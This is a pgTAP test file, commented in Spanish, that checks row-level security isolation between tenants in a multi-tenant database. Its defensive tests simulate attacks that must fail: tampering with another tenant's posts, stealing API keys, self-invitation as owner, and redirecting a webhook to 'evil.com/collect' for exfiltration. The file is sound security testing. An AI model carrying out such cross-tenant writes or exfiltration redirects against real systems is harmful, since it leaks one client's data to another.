-- =====================================================================
-- TEST BLOQUEANTE: aislamiento entre tenants
--
-- Si este archivo falla, el despliegue se detiene. En un multi-tenant
-- sobre base de datos compartida, una fuga aquí es una fuga de datos de
-- un cliente a otro.
--
--   ejecutar: supabase test db
-- =====================================================================
\ir helpers.psql

begin;
select no_plan();

-- =====================================================================
-- 0. GUARDIA ESTRUCTURAL
--
-- Los tests de abajo comprueban tablas nombradas a mano. Este comprueba
-- las que nadie se acordó de nombrar: una tabla nueva con `tenant_id` y
-- sin RLS no rompe nada visible — la app funciona, la suite pasa, y el
-- aislamiento simplemente no existe. Es el fallo más probable de todos.
-- =====================================================================
select is_empty(
  $$
    select c.relname
    from pg_class c
    join pg_namespace n on n.oid = c.relnamespace
    join pg_attribute a on a.attrelid = c.oid
    where n.nspname = 'public'
      and c.relkind = 'r'
      and a.attname = 'tenant_id'
      and a.attnum > 0
      and not a.attisdropped
      and not c.relrowsecurity
  $$,
  'TODA tabla de public con columna tenant_id tiene RLS habilitada'
);

-- `ENABLE` no basta: sin `FORCE`, el propietario de la tabla se salta sus
-- propias políticas — y las migraciones crean las tablas como propietario.
select is_empty(
  $$
    select c.relname
    from pg_class c
    join pg_namespace n on n.oid = c.relnamespace
    join pg_attribute a on a.attrelid = c.oid
    where n.nspname = 'public'
      and c.relkind = 'r'
      and a.attname = 'tenant_id'
      and a.attnum > 0
      and not a.attisdropped
      and not c.relforcerowsecurity
  $$,
  'TODA tabla con tenant_id tiene además FORCE ROW LEVEL SECURITY'
);

-- Una tabla con RLS y sin políticas queda inaccesible: falla en runtime,
-- no en el test. Mejor detectarlo aquí.
select is_empty(
  $$
    select c.relname
    from pg_class c
    join pg_namespace n on n.oid = c.relnamespace
    join pg_attribute a on a.attrelid = c.oid
    where n.nspname = 'public'
      and c.relkind = 'r'
      and a.attname = 'tenant_id'
      and a.attnum > 0
      and not a.attisdropped
      and not exists (select 1 from pg_policy p where p.polrelid = c.oid)
  $$,
  'ninguna tabla con tenant_id se queda sin políticas'
);

-- ---------------------------------------------------------------------
-- ESCENARIO
--   Tenant A (Rukma) — alice es OWNER
--   Tenant B (Acme)  — bob   es OWNER
--   mallory          — usuario sin ninguna membresía
--   root             — SuperAdmin de Rukma Studio
-- ---------------------------------------------------------------------
create temporary table fx (k text primary key, v uuid);
-- Legible tras login_as(): las temp tables no heredan permisos.
grant select on fx to public;

insert into fx (k, v) values
  ('alice',   tests.create_user('alice@rukma.studio')),
  ('bob',     tests.create_user('bob@acme.com')),
  ('mallory', tests.create_user('mallory@evil.com')),
  ('root',    tests.create_user('fcojhormazabalh@gmail.com', true)),
  ('tenantA', tests.create_tenant('rukma')),
  ('tenantB', tests.create_tenant('acme'));

select tests.add_member(
  (select v from fx where k = 'tenantA'),
  (select v from fx where k = 'alice'), 'OWNER');
select tests.add_member(
  (select v from fx where k = 'tenantB'),
  (select v from fx where k = 'bob'), 'OWNER');

create temporary table seeded (tenant text primary key, ids jsonb);
grant select on seeded to public;
insert into seeded values
  ('A', tests.seed_content((select v from fx where k = 'tenantA'), (select v from fx where k = 'alice'))),
  ('B', tests.seed_content((select v from fx where k = 'tenantB'), (select v from fx where k = 'bob')));

-- =====================================================================
-- 1. LECTURA — alice NO ve una sola fila del tenant B
-- =====================================================================
select tests.login_as((select v from fx where k = 'alice'));

select is(
  tests.rows_visible(tbl, (select v from fx where k = 'tenantB')),
  0::bigint,
  format('alice no ve filas de otro tenant en public.%s', tbl)
)
from unnest(array[
  'tenants', 'tenant_users', 'categories', 'tags',
  'posts', 'media', 'api_keys', 'webhooks',
  'webhook_deliveries', 'audit_logs'
]) as tbl;

-- ...y sí ve las suyas (un test que sólo comprueba ceros pasaría con RLS
-- mal configurada que bloquee absolutamente todo).
select is(
  tests.rows_visible(tbl, (select v from fx where k = 'tenantA')),
  1::bigint,
  format('alice sí ve sus propias filas en public.%s', tbl)
)
from unnest(array['categories', 'tags', 'posts', 'media', 'api_keys', 'webhooks']) as tbl;

-- Tablas sin tenant_id propio: heredan el aislamiento vía el post padre.
select is(
  (select count(*) from public.post_tags pt
   join public.posts p on p.id = pt.post_id
   where p.tenant_id = (select v from fx where k = 'tenantB')),
  0::bigint,
  'alice no ve post_tags del tenant B'
);

-- El hash de la API key jamás debe llegar al cliente: la vista lo omite.
select hasnt_column('public', 'api_keys_public', 'key_hash',
  'la vista api_keys_public no expone key_hash');

-- =====================================================================
-- 2. ESCRITURA — alice no puede tocar datos del tenant B
-- =====================================================================

-- 2.1 UPDATE cruzado: RLS lo convierte en un no-op (0 filas), no en error.
--     Por eso se afirma sobre el conteo, no con throws_ok.
with attempt as (
  update public.posts set title = 'HACKED'
  where tenant_id = (select v from fx where k = 'tenantB')
  returning 1
)
select is((select count(*) from attempt), 0::bigint,
  'UPDATE sobre posts de otro tenant no afecta a ninguna fila');

-- 2.2 DELETE cruzado
with attempt as (
  delete from public.posts
  where tenant_id = (select v from fx where k = 'tenantB')
  returning 1
)
select is((select count(*) from attempt), 0::bigint,
  'DELETE sobre posts de otro tenant no afecta a ninguna fila');

-- 2.3 INSERT en el tenant ajeno: la política WITH CHECK sí lanza error.
select throws_ok(
  format(
    'insert into public.posts (tenant_id, author_id, slug, title)
     values (%L, %L, ''intruso'', ''Intruso'')',
    (select v from fx where k = 'tenantB'),
    (select v from fx where k = 'alice')
  ),
  '42501',
  null,
  'INSERT de un post en otro tenant es rechazado por RLS'
);

-- 2.4 Auto-invitarse al tenant ajeno — el vector de escalada más obvio
select throws_ok(
  format(
    'insert into public.tenant_users (tenant_id, user_id, role)
     values (%L, %L, ''OWNER'')',
    (select v from fx where k = 'tenantB'),
    (select v from fx where k = 'alice')
  ),
  '42501',
  null,
  'no se puede auto-añadir como miembro de otro tenant'
);

-- 2.5 Robo de API key ajena
with attempt as (
  update public.api_keys set revoked_at = null, scopes = array['*']
  where tenant_id = (select v from fx where k = 'tenantB')
  returning 1
)
select is((select count(*) from attempt), 0::bigint,
  'no se pueden modificar las API keys de otro tenant');

-- 2.6 Redirigir el webhook ajeno a un endpoint propio (exfiltración)
with attempt as (
  update public.webhooks set url = 'https://evil.com/collect'
  where tenant_id = (select v from fx where k = 'tenantB')
  returning 1
)
select is((select count(*) from attempt), 0::bigint,
  'no se puede redirigir el webhook de otro tenant');

-- 2.7 Referencia cruzada: post propio apuntando a una categoría ajena.
--     RLS no lo cubre (el tenant_id de la fila es válido); lo bloquea
--     el trigger de integridad.
select throws_ok(
  format(
    'insert into public.posts (tenant_id, category_id, author_id, slug, title)
     values (%L, %L, %L, ''cruzado'', ''Cruzado'')',
    (select v from fx where k = 'tenantA'),
    (select (ids ->> 'category')::uuid from seeded where tenant = 'B'),
    (select v from fx where k = 'alice')
  ),
  'P0001',
  'category_id pertenece a otro tenant',
  'un post no puede referenciar una categoría de otro tenant'
);

-- =====================================================================
-- 3. USUARIO SIN MEMBRESÍA — no ve absolutamente nada
-- =====================================================================
select tests.logout();
select tests.login_as((select v from fx where k = 'mallory'));

select is(
  tests.rows_visible(tbl, (select v from fx where k = 'tenantA')) +
  tests.rows_visible(tbl, (select v from fx where k = 'tenantB')),
  0::bigint,
  format('un usuario sin membresía no ve nada en public.%s', tbl)
)
from unnest(array[
  'tenants', 'tenant_users', 'categories', 'tags',
  'posts', 'media', 'api_keys', 'webhooks', 'audit_logs'
]) as tbl;

-- Tampoco puede crearse un tenant y colarse: eso es exclusivo del SuperAdmin.
select throws_ok(
  'insert into public.tenants (slug, name) values (''pirata'', ''Pirata'')',
  '42501',
  null,
  'un usuario normal no puede crear tenants'
);

-- =====================================================================
-- 4. ANÓNIMO — la API pública no pasa por `anon`
-- =====================================================================
select tests.logout();
select tests.login_as_anon();

select throws_ok(
  'select count(*) from public.posts',
  '42501',
  null,
  'el rol anon no tiene acceso ni siquiera a la tabla posts'
);

-- =====================================================================
-- 5. SUPERADMIN — Rukma Studio sí ve todo (soporte y operación)
-- =====================================================================
select tests.logout();
select tests.login_as((select v from fx where k = 'root'));

-- Se cuentan SÓLO las filas de este escenario, no todas las de la base:
-- el seed de desarrollo también inserta tenants y posts, y un conteo
-- absoluto haría que el test fallara según cuándo se ejecute.
select is(
  (select count(*) from public.tenants
   where id in ((select v from fx where k = 'tenantA'), (select v from fx where k = 'tenantB'))),
  2::bigint,
  'el SuperAdmin ve los tenants de ambos clientes'
);
select is(
  (select count(*) from public.posts
   where tenant_id in ((select v from fx where k = 'tenantA'), (select v from fx where k = 'tenantB'))),
  2::bigint,
  'el SuperAdmin ve los posts de ambos clientes'
);
select lives_ok(
  'insert into public.tenants (slug, name) values (''nuevo-cliente'', ''Nuevo Cliente'')',
  'el SuperAdmin puede dar de alta tenants'
);

select tests.logout();
select * from finish();
rollback;
